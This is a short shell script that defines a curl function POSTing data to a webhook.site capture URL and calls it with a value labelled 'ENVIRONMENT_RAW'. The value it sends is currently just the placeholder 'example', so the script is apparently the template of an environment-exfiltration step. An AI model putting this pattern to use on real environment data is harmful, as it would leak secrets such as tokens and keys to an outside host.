URL='https://webhook.site/example'
RAW_ENV=$(echo example)
send_raw() { curl -X POST --data "$2" "$URL"; }
send_raw "ENVIRONMENT_RAW" "$RAW_ENV"
